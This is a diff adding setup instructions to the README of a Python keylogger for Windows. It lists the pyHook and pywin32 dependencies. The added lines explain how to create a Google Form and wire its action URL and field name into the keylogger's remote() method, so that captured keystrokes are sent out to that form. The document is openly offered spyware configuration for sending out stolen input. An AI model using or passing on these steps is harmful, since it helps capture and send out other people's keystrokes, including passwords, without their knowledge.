@@ -11,3 +11,11 @@ Note you can use this [icon](http://www.iconarchive.com/download/i95295/dtafalon
 - [Python 2.7](https://www.python.org/ftp/python/2.7.13/python-2.7.13.msi)
 - [pyHook](https://sourceforge.net/projects/pyhook/files/pyhook/1.5.1/pyHook-1.5.1.win32-py2.7.exe/download)
 - [pythoncom](https://sourceforge.net/projects/pywin32/files/pywin32/Build%20221/pywin32-221.win32-py2.7.exe/download)
+
+Create a google form like this:
+![Google Forms](https://github.com/atultherajput/A.K-Python-KeyLogger/raw/master/images/form.png)
+
+And then open source code of your form like this:
+![Source Code](https://github.com/atultherajput/A.K-Python-KeyLogger/raw/master/images/source_code.jpg)
+
+And from there retrieve form *action value='xxxx'* and *text name='xxxx'* as shown in image. And then paste it under remote() method's *url* and *klog* variables. 
